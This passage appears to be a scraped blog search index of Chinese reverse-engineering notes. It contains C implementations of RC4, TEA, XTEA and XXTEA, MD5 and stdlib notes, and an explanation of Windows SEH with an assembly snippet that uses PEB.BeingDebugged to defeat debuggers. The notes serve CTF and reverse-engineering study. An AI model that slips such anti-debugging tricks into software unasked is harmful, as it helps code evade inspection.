&#125; decode[len_decode] = 0; return (char*)decode;&#125;uint* find_index(const char* base_table_, const char* source_)&#123; char* base_table = (char*)calloc(1024, sizeof(char)); char* source = (char*)calloc(1024, sizeof(char)); int* index_table = (int*)calloc(1024, sizeof(int)); if (base_table == NULL || source == NULL || index_table == NULL) &#123; puts(&quot;find_index calloc wrong&quot;); exit(-1); &#125; unsigned int i = 0, ii = 0; strcpy(base_table, base_table_); strcpy(source, source_); for (i = 0; i &lt; strlen(source); i++) for (ii = 0; ii &lt; strlen(base_table); ii++) if (source[i] == base_table[ii]) index_table[i] = ii; free(base_table); free(source); return (uint*)index_table;&#125; 任意BASE","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"RC4系列加密算法","path":"/re4mile/2021/06/07/re/加密算法/基础/RC4/re/","content":"待学习的参考链接在线网站MD5 https://www.cmd5.com/ RC4123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;qdll.h&gt;BYTE KeyStream[1024]; void swapt(BYTE* a, BYTE* b);void Init_Rand_Box(BYTE* Box, BYTE* Key);void Make_Key_Stream(DWORD32 Len_input, BYTE* Box_In, BYTE* KeyStream_Out);void test();int main()&#123; test(); return 0;&#125;void test()&#123; BYTE Input[] = &quot;You_Love_Re&quot;; BYTE Key[] = &quot;D0g3&quot;; BYTE Box[256]; DWORD32 len = 0, i = 0; len = strlen(Input); qZero(Box, 256); Init_Rand_Box(Box, Key); Make_Key_Stream(len, Box, KeyStream); for (i = 0; i &lt; len; i++) &#123; Input[i] ^= KeyStream[i]; printf(&quot;%02X &quot;, Input[i]); if ((i + 1) % 8 == 0) puts(&quot;&quot;); &#125; puts(&quot; -----------------------&quot;);&#125;void swapt(BYTE* a,BYTE* b)&#123; DWORD32 dw_tmp = 0; dw_tmp = *a; *a = *b; *b = dw_tmp;&#125;void Init_Rand_Box(BYTE* Box, BYTE* Key)//类型还是int&#123; DWORD32 j = 0, i = 0; DWORD32 Len_Key = 0; Len_Key = strlen(Key); for (i = 0; i &lt; 256; i++) Box[i] = i; for (i = 0; i &lt; 256; i++) &#123; j = (BYTE)(j + Box[i] + Key[i%Len_Key]); swapt(&amp;Box[i], &amp;Box[j]); &#125;&#125;void Make_Key_Stream(DWORD32 Len_input, BYTE* Box_In, BYTE* KeyStream_Out)//生成的密码长度取决于你的inptu_长度&#123; // 生成密钥流 DWORD32 i = 0, j = 0, k = 0, dw_tmp = 0 ,index = 0; while (Len_input--) //密钥流的长度取决于你的len_input &#123; //生成密钥流 i = (BYTE)(i + 1) ; j = (BYTE)(j + Box_In[i]); k = (BYTE)(Box_In[i] + Box_In[j]); swapt(&amp;Box_In[i], &amp;Box_In[j]); KeyStream_Out[index] = Box_In[k]; index++; &#125;&#125;","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"TEA系列加密算法","path":"/re4mile/2021/06/07/re/加密算法/基础/TEA/re/","content":"待学习的参考链接傅里叶加密 https://joi.usst.edu.cn/html/2015/1/20150116.htm#outline_anchor_5 https://zhuanlan.zhihu.com/p/104079068 https://baike.baidu.com/item/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/7119029 https://www.cnblogs.com/h2zZhou/p/8405717.html 参考链接 https://www.cnblogs.com/zpchcbd/p/15974293.html 为什么说tea系列加密是可逆的,可能因为算法比较简单吧 在线网站MD5 https://www.cmd5.com/ teaC1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; //加密函数void encrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;//解密函数void decrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++) &#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; int main()&#123; uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u &quot;,v[0],v[1]); encrypt(v, k); printf(&quot;加密后的数据：%u %u &quot;,v[0],v[1]); decrypt(v, k); printf(&quot;解密后的数据：%u %u &quot;,v[0],v[1]); return 0;&#125; 1字节的加密,也就是我们的加密是基于1字节的单位(未完善) C++123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;//我的delta是0x17class tea&#123;private: unsigned char* input=0; unsigned char* key = 0; int input_len = 0; int key_len = 0; unsigned char delta = 0x17; int round=32; unsigned char delta_sum= delta*round;public: tea(char* qinput,char* qkey,unsigned char qdelta,int qround) &#123; input_len = strlen(qinput); key_len = strlen(qkey); input = new unsigned char[input_len + 1]; memset(input, 0, input_len + 1); memcpy(input, qinput, input_len); key = new unsigned char[key_len]; memset(key, 0, key_len); memcpy(key, qkey, key_len); round = qround; delta = qdelta; delta_sum = qdelta * qround;//这里我们采用的8次循环 &#125; ~tea() &#123; delete[] key; delete[] input; &#125; void encrypt(); void decrypt(); //void show() //&#123; // puts((char*)out); //&#125; //void swapt(unsigned char*, unsigned char*, unsigned char*, unsigned char*); //void make(unsigned char*, unsigned char, unsigned char, unsigned char); //void b64encode(unsigned char*, unsigned int);&#125;;void tea::encrypt()&#123; int i = 0, j = 0, len = 0; unsigned char v0 = 0, v1 = 0; unsigned char sum = 0; if (input_len % 2) &#123; len = input_len / 2 + 1; &#125; else &#123; len = input_len / 2; &#125; for (j = 0; j &lt; len; j++) &#123; v0 = input[2 * j + 0]; v1 = input[2 * j + 1]; sum = 0; for (i = 0; i &lt; round; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + key[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + key[1]); v1 += ((v0 &lt;&lt; 4) + key[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + key[3]); &#125; /* end cycle */ input[2 * j + 0] = v0; input[2 * j + 1] = v1; &#125;&#125;void tea::decrypt()//给加密数据,循环次数,delta才可以&#123; int i = 0, j = 0, len = 0; unsigned char sum = 0,v0=1,v1=0; if (input_len % 2) &#123; len = input_len / 2 + 1; &#125; else &#123; len = input_len / 2; &#125; for (j = 0; j &lt; len; j++) &#123; sum = delta_sum; v0 = input[2 * j + 0]; v1 = input[2 * j + 1]; for (i = 0; i &lt; 32; i++) &#123; /* basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + key[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + key[3]); v0 -= ((v1 &lt;&lt; 4) + key[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + key[1]); sum -= delta; &#125; /* end cycle */ input[2 * j + 0]=v0; input[2 * j + 1]=v1; &#125;&#125;/*void tea::swapt(unsigned char* qinput, unsigned char* v0, unsigned char* v1, unsigned char* v2)&#123; static int i = 0, j = 0, k = 0;Label2: for (; i &lt; 3; i++) &#123; for (; j &lt; 3; j++) &#123; if (j == i) &#123; continue; &#125; for (; k &lt; 3; k++) &#123; if (k == i || k == j) &#123; continue; &#125; goto Label_1; &#125; k = (k == 3 ? 0 : k); &#125; j = (j == 3 ? 0 : j); &#125; i = (i == 3 ? 0 : i); if (i == 0 &amp;&amp; j == 0 &amp;&amp; k == 0) goto Label2;Label_1: *v0 = qinput[i]; *v1 = qinput[j]; *v2 = qinput[k]; printf(&quot;%d %d %d &quot;, i, j, k); k++; return;&#125;void tea::make(unsigned char* qinput, unsigned char v0, unsigned char v1, unsigned char v2)&#123; qinput[0] = v0; qinput[1] = v1; qinput[2] = v2; return;&#125;void tea::b64encode(unsigned char* qout, unsigned int tmp)&#123; qout[0] = table[tmp &gt;&gt; 26]; qout[1] = table[(tmp &gt;&gt; 20) % 64]; qout[2] = table[(tmp &gt;&gt; 14) % 64]; qout[3] = table[(tmp &gt;&gt; 8 ) % 64]; return;&#125;*/int main()&#123; char data[] = &quot;D0g3&#123;re4mile_make_it_for_you&#125;&quot;;//D0g3&#123;re4mile_make_it_for_you&#125; char key[] = &quot;D0g3L0ver&quot;; char table[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789@#&quot;;; tea* local_tea = new tea(data,key,0x17,32); local_tea-&gt;encrypt(); local_tea-&gt;decrypt(); return 0;&#125; xtea如果要小小的魔改的话 1). 修改移位 2). 修改key长度,打破输入明文的长度 3). delta当然要修改 C12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125; void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125; int main()&#123; uint32_t v[2]=&#123;1,2&#125;; uint32_t const k[4]=&#123;2,2,3,4&#125;; unsigned int r=32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u &quot;,v[0],v[1]); encipher(r, v, k); printf(&quot;加密后的数据：%u %u &quot;,v[0],v[1]); decipher(r, v, k); printf(&quot;解密后的数据：%u %u &quot;,v[0],v[1]); return 0;&#125; C++123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define bType long longclass xtea&#123;private:\tchar* DataByte;\tchar* Key;\tunsigned int* DataInt;\tbType Datalen;\tbType round;\tunsigned int Delta1;\tunsigned int Delta2;\tvoid swapt();public:\txtea()\t&#123; DataByte = 0; DataInt = 0; Key = 0; Datalen = 0; round = 0; Delta1 = 0; Delta2 = 0;\t&#125;\txtea(char* In_Key, char* In_DataByte, bType In_round,unsigned int In_Delta1)\t&#123; Key = In_Key; DataByte = In_DataByte; round = In_round; Datalen = strlen(DataByte); DataInt = 0; Delta1 = In_Delta1; Delta2 = In_Delta1 * In_round;\t&#125;\tvoid encode();\tvoid decode();&#125;;void xtea::swapt()&#123;\tbType i = 0;\tDataInt = new unsigned int[Datalen];\tfor (i = 0; i &lt; Datalen; i++)\t&#123; DataInt[i] = DataByte[i];\t&#125;&#125;void xtea::encode()&#123;\tbType i=0,j=0; unsigned int sum = 0;\tunsigned int v0 = 0, v1 = 0;\tswapt();\tfor (j = 0; j &lt; Datalen; j += 2)\t&#123; v0 = DataInt[j+0]; v1 = DataInt[j + 1]; sum = 0; for (i = 0; i &lt; round; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + Key[sum &amp; 3]); sum += Delta1; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + Key[(sum &gt;&gt; 11) &amp; 3]); &#125; DataInt[j + 0]=v0; DataInt[j + 1]=v1;\t&#125;&#125;void xtea::decode()&#123;\tbType i = 0,j = 0;\tunsigned int v0 = 0, v1 = 0;\tunsigned int sum = 0;\tfor (j = 0; j &lt; Datalen; j += 2)\t&#123; v0 = DataInt[j + 0]; v1 = DataInt[j + 1]; sum = Delta2;//有点容易忘记 for (i = 0; i &lt; round; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + Key[(sum &gt;&gt; 11) &amp; 3]); sum -= Delta1; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + Key[sum &amp; 3]); &#125; DataInt[j+0] = v0; DataInt[j+1] = v1;\t&#125;&#125;int main()&#123;\tchar key[] = &quot;D0g3&quot;;\tchar data[] = &quot;re4Mile0&quot;;//re4Mile\tunsigned int delata = 0x9E3779B9;\txtea local_xtea(key,data,16,delata);\tlocal_xtea.encode();\tlocal_xtea.decode();\treturn 0;&#125; 魔改1每次加密都^i 123456789101112131415161718192021__int64 __fastcall tea_encode(int len, unsigned int *input, int *key)&#123; __int64 result; // rax int i; // [rsp+24h] [rbp-14h] unsigned int v0; // [rsp+28h] [rbp-10h] unsigned int v1; // [rsp+2Ch] [rbp-Ch] unsigned int delta; // [rsp+30h] [rbp-8h] v0 = input[0]; v1 = input[1]; delta = 0; for ( i = 0; i &lt; len; ++i ) &#123; v0 += (key[delta &amp; 3] + delta) ^ (((v1 &gt;&gt; 5) ^ (16 * v1)) + v1) ^ i; delta -= 0x61C88647 ;//这里 -0x61C88647 等价于 + 0x9E3779B9 v1 += (key[(delta &gt;&gt; 11) &amp; 3] + delta) ^ (((v0 &gt;&gt; 5) ^ (16 * v0)) + v0) ^ i; &#125; input[0] = v0; input[1] = v1; return 0;&#125; 逆向脚本,异或回去呗 1 xxteaC123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4])&#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ &#123; rounds = 6 + 52/n; sum = 0; z = v[n-1]; do &#123; sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) &#123; y = v[p+1]; z = v[p] += MX; &#125; y = v[0]; z = v[n-1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) /* Decoding Part */ &#123; n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125;&#125; int main()&#123; uint32_t v[2]= &#123;1,2&#125;; uint32_t const k[4]= &#123;2,2,3,4&#125;; int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u &quot;,v[0],v[1]); btea(v, n, k); printf(&quot;加密后的数据：%u %u &quot;,v[0],v[1]); btea(v, -n, k); printf(&quot;解密后的数据：%u %u &quot;,v[0],v[1]); return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define First 0#define End (len_input-1)#define same \\ if (i == First)\\ old_one = Data[End];\\ else\\ old_one = Data[i - 1];\\ if (i == End)\\ next_one = Data[First];\\ else\\ next_one = Data[i + 1];\\ a = old_one &gt;&gt; 5 ^ next_one &lt;&lt; 2;\\ b = next_one &gt;&gt; 3 ^ old_one &lt;&lt; 4;\\ c = sum ^ next_one;\\ d = key[(i &amp; 0b11) ^ Pi] ^ old_one;void encrypt(unsigned int* Data, unsigned int* key, unsigned int len_input)&#123; unsigned int next_one = 0, old_one = 0; unsigned int delta = 0x9e3779b9, rounds = 0, sum = 0, Pi = 0; unsigned int i = 0; unsigned int a = 0, b = 0, c = 0, d = 0; rounds = 6 + 52 / len_input;//轮回的次数 for (; rounds; rounds--)//先设置end的值为最后一个，因为加密第一个要用 &#123; sum += delta; Pi = (sum &gt;&gt; 2) &amp; 3; for (i = 0; i &lt; len_input; i++) &#123; same; Data[i] += (a + b) ^ (c + d); &#125; &#125;&#125;void decrypt(unsigned int* Data, unsigned int* key, unsigned int len_input)&#123; unsigned int next_one, old_one, sum; unsigned int rounds, Pi, delta = 0x9e3779b9; int i; unsigned int a = 0, b = 0, c = 0, d = 0; rounds = 6 + 52 / len_input; sum = rounds * delta; Pi = (sum &gt;&gt; 2) &amp; 3; for (; rounds; rounds--) &#123; for (i = End; i &gt;= 0; i--) &#123; same; Data[i] -= ((a + b) ^ (c + d)); &#125; sum -= delta; Pi = (sum &gt;&gt; 2) &amp; 3; &#125;&#125;unsigned int* str_num(char* s)&#123; return (unsigned int*)s;&#125;int main()&#123; char qkey[] = &quot;D0g3&quot;; char qData[] = &quot;dqx-0x9d&quot;; unsigned int* flag = str_num(qData); unsigned int* key = str_num(qkey); unsigned int len = strlen(qData); encrypt(flag, key, len); decrypt(flag, key, len); return 0;&#125;","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"MD5加密算法","path":"/re4mile/2021/06/07/re/加密算法/高级/MD5/re/","content":"介绍对输入的任意长度进行运算,产生一个128位的摘要 算法原理 (1)数据填充： 填充的方法是填充一个1和n个0。 使得 len%512&#x3D;512-64&#x3D;448 你的长度-448是512的倍数 (2),记录信息长度 之前我们有len%512=512-64=448 现在用64位来存储填充前信息长度。这样信息长度就变为 real_len&#x3D;N*512+448+64&#x3D;(N+1)*512位 (3)装入标准的幻数（四个整数） 标准的幻数（物理顺序） A&#x3D;(01234567) 16 ， B&#x3D;(89ABCDEF) 16 ， C&#x3D;(FEDCBA98) 16 ， D&#x3D;(76543210) 16 。 如果在程序中定义应该(A&#x3D;0x67452301L，B&#x3D;0xEFCDAB89L，C&#x3D;0x98BADCFEL，D&#x3D;0x10325476L）。有点晕哈，其实想一想就明白了 (4)四轮循环运算： 循环的次数是分组的个数（N+1）","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"stdlib字符串处理","path":"/re4mile/2021/06/07/language/C/库函数/stdlib/字符串处理/language/","content":"参考链接https://blog.csdn.net/qq_44205382/article/details/109528735 ato-定义函数： 12345double atof(const char *nptr); // string-&gt;doubleint atoi(const char *nptr); // string-&gt;intlong atol(const char *nptr); // strong-&gt;long 函数说明： 会扫描参数nptr字符串, 跳过前面的空格字符, 直到遇上数字或正负符号才开始做转换, 而再遇到非数字或字符串结束时才结束转换,并将结果返回。比如遇到空格就g 参数nptr字符串可包含正负号、小数点或E(e)来表示指数部分,如123.456或123e-2。 返回值：返回转换后的浮点型数。 附加说明：atof()与使用strtod(nptr,(char**)NULL)结果相同 附加说明：atoi()与使用strtol(nptr,(char**)NULL,10);结果相同 附加说明：atol()与使用strtol(nptr,(char**)NULL,10);结果相同 123456789101112131415#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; char* a = &quot;3.1415&quot;; char* b = &quot;-200e-2&quot;;//200,整数没有科学计数法,小数才有 printf(&quot;%lf %lf &quot;, atof(a), atof(b)); printf(&quot;%d %d &quot;, atoi(a), atoi(b));//整数没有科学计数法,小数才有 printf(&quot;%ld %ld &quot;, atol(a),atol(b));//整数没有科学计数法,小数才有\treturn 0;&#125; strto-123double strtod(const char *nptr,char **endptr); //string -&gt; doubleint strtol(const char *nptr,char **endptr,int base); //string-&gt;long unsigned int strtoul(const char *nptr,char **endptr,int base);//strong unsigned long strtod函数说明： strtod()会扫描参数nptr字符串, 跳过前面的空格字符,直到遇上数字或正负符号才开始做转换,到出现非数字或字符串结束时 (‘&#x2F;0’)才结束转换,并将结果返回。 若endptr不为NULL,则会将遇到不合条件而终止的nptr中的字符指针由endptr传回。 参数nptr字符串可包含正负号、小数点或E(e)来表示指数部分。如123.456或123e-2。 返回值：返回转换后的浮点型数。 strtol函数说明： strtol()会将参数nptr字符串根据参数base来转换成长整型数。 参数base范围从2至36,或0。 参数base代表采用的进制方式, 如base值为10则采用10进制, 若base值为16则采用16进制等。 当base值为0时则是采用10进制做转换,但遇到如’0x’前置字符则会使用16进制做转换。 一开始strtol()会扫描参数nptr字符串,跳过前面的空格字符,直到遇上数字或正负符号才开始做转换, 再遇到非数字或字符串结束时(‘&#x2F;0’)结束转换,并将结果返回。 若参数endptr不为NULL,则会将遇到不合条件而终止的nptr中的字符指针由endptr返回。 返回值 返回转换后的长整型数,否则返回ERANGE并将错误代码存入errno中。 附加说明：ERANGE指定的转换字符串超出合法范围。 12345678910111213141516171819#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; char a[] = &quot;1000000000&quot;; char b[] = &quot;1234ffff&quot;; char* c = 0; printf(&quot;a = %d &quot;, (int)strtod(a, NULL)); printf(&quot;b = %d &quot;, (int)strtod(b, &amp;c)); if (c) &#123; printf(&quot;c = %s &quot;, c); &#125;\treturn 0;&#125; 123456789101112131415161718192021#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; char a[] = &quot;1000&quot;; char b[] = &quot;0x64&quot;; char* c = 0; printf(&quot;10:a = %d &quot;, strtol(a, NULL,10)); printf(&quot;10:a = %d &quot;, strtol(a, NULL, 0)); printf(&quot;16:a = %d &quot;, strtol(a, NULL, 16)); printf(&quot;01:a = %d &quot;, strtol(a, NULL, 2)); printf(&quot;16:b = %d &quot;, strtol(b, NULL, 16)); printf(&quot;16:b = %d &quot;, strtol(b, NULL, 0));\treturn 0;&#125; 数字转字符串1char *gcvt(double number,size_t ndigits,char *buf); gcvt函数说明： gcvt()用来将参数number转换成ASCII码字符串,参数ndigits表示显示的位数。 gcvt()与ecvt()和fcvt()不同的地方在于, gcvt()所转换后的字符串包含小数点或正负符号。若转换成功,转换后的字符串会放在参数buf指针所指的空间。 返回值：返回一字符串指针,此地址即为buf指针 123456789101112131415161718192021#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; double a = 3.1415926; double b = -3.1415926; char sz_tmp[64] = &#123;0&#125;; _gcvt(a, 2, sz_tmp);//保留2位数 printf(&quot;a value = %s &quot;, sz_tmp); _gcvt(b, 4, sz_tmp);//保留4位数 printf(&quot;b value = %s &quot;, sz_tmp);\treturn 0;&#125; 转ASCII1int toascii(int c)","tags":["C语言库函数"],"categories":["Language"]},{"title":"win32篇-美化","path":"/re4mile/2021/06/07/language/C/win32/小专题/美化/language/","content":"终端字体颜色SetConsoleTextAttribute函数用法","tags":["C"],"categories":["language"]},{"title":"EXE反调试小专题 SEH链","path":"/re4mile/2021/06/07/re/反调试/exe/小专题/SEH异常处理/re/","content":"参考链接基础异常的处理方式 在调试器下,手动修改异常 正常运行下,exe自己有处理函数 其他情况下,系统处理(通常是关闭) SEH链 1234struct _EXCEPTION_REGISTRATION_RECORD &#123; struct _EXCEPTION_REGISTRATION_RECORD *Next; //下一个节点 PEXCEPTION_ROUTINE Handler;//异常处理函数的地址&#125; EXCEPTION_REGISTRATION_RECORD; 异常处理会遍历每个SEH链节点,如果该节点可以处理异常,就不再往后遍历 异常处理函数 123456EXCEPTION_DISPOSITION __cdecl _except_handler( _In_ struct _EXCEPTION_RECORD* _ExceptionRecord, _In_ void* _EstablisherFrame, _Inout_ struct _CONTEXT* _ContextRecord, _Inout_ void* _DispatcherContext ); 参数1是结构体指针 123456789struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode; //异常类型 DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress;//异常发生的地点 DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; &#125; EXCEPTION_RECORD; 参数3 一个线程上下文的结构体指针,与运行环境有关,包含了所有的寄存器数据 1234567891011121314151617181920212223242526272829303132333435363738struct DECLSPEC_NOINITALL _CONTEXT &#123; DWORD ContextFlags; DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; FLOATING_SAVE_AREA FloatSave; DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; DWORD Ebp; DWORD Eip;//SEH处理后要去往的地址 DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT 每个线程都有自己的CONTEXT结构体和栈空间 返回值 12345678enum _EXCEPTION_DISPOSITION&#123; ExceptionContinueExecution, //继续执行异常代码 0 ExceptionContinueSearch,\t//运行下一个异常处理器 1 ExceptionNestedException, //2 ExceptionCollidedUnwind // 3&#125; EXCEPTION_DISPOSITION; 异常处理函数会根据处理情况返回的枚举变量, 返回1 表示异常未处理,需要去往下一个异常 12345678struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode; DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; &#125; EXCEPTION_RECORD; 如果你没有在SEU的handler设置断点,那么你是看不到handler的单步执行的 在没有触发异常的情况下执行异常的handler,会报错…..5555 SEH不是简单的除了异常,在异常里面可能还藏有很多的秘密 所以异常还是有必要跟进的 SEH构成 123next指针 指向下一个SEH结构体handle指针 指向处理异常的函数//所以的话,结构体是由 下一个结构体指针 和 当前的处理函数指针 组成 SEH的安装 ps:栈实现简单的链表 原来的链条 123next handle\t..//fs:[00]指向了第一个结构体 现在 12push new handlepush fs:[00] 栈中的数据变为了 12next 原来的第一个结构体指针handle 当前新定义的handle 所以安装后,我们要让fs:[00]指向我们新定义的SEH结构体 于是 1mov dword ptr fs:[00],esp 触碰异常后,栈中的数据会发生变化 1234ESP ==&gt; 返回到 ntdll.77688882ESP+4 参数1 --&gt;异常类型,ExceptionCodeESP+8 参数2 = SEH[0] || --&gt;next\tESP+C 参数3 --&gt;Context, pContext+0xb8--&gt;异常代码的VA 123456789mov esi,dword ptr ss:[esp+0xC] ; esi --&gt;Contextmov eax,dword ptr fs:[0x30] ;eax-&gt;PEBcmp byte ptr ds:[eax+0x2],0x1 ;&amp;PEB+2 BeingDebugged成员,用于反调试jnz short seh.00401076 ;如果不是调试就跳转mov dword ptr ds:[esi+0xB8],seh.00401023 ;如果是调试,就把异常代码的VA=设置位反调试位置,阻止调试jmp short seh.00401080mov dword ptr ds:[esi+0xB8],seh.00401039 ;如果不是调试,刚才就跳转到这里来,然后把异常vA设置为,从而正确处理异常事件xor eax,eaxretn 附录一些异常表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#define STILL_ACTIVE STATUS_PENDING#define EXCEPTION_ACCESS_VIOLATION STATUS_ACCESS_VIOLATION //0xC0000005#define EXCEPTION_DATATYPE_MISALIGNMENT STATUS_DATATYPE_MISALIGNMENT //0x80000002#define EXCEPTION_BREAKPOINT STATUS_BREAKPOINT //0x800000003#define EXCEPTION_SINGLE_STEP STATUS_SINGLE_STEP //0x80000004#define EXCEPTION_ARRAY_BOUNDS_EXCEEDED STATUS_ARRAY_BOUNDS_EXCEEDED //0xC000008C#define EXCEPTION_FLT_DENORMAL_OPERAND STATUS_FLOAT_DENORMAL_OPERAND //0xC000008D#define EXCEPTION_FLT_DIVIDE_BY_ZERO STATUS_FLOAT_DIVIDE_BY_ZERO //0xC000008E#define EXCEPTION_FLT_INEXACT_RESULT STATUS_FLOAT_INEXACT_RESULT //0xC000008F#define EXCEPTION_FLT_INVALID_OPERATION STATUS_FLOAT_INVALID_OPERATION //0xC0000090#define EXCEPTION_FLT_OVERFLOW STATUS_FLOAT_OVERFLOW //0xC0000091#define 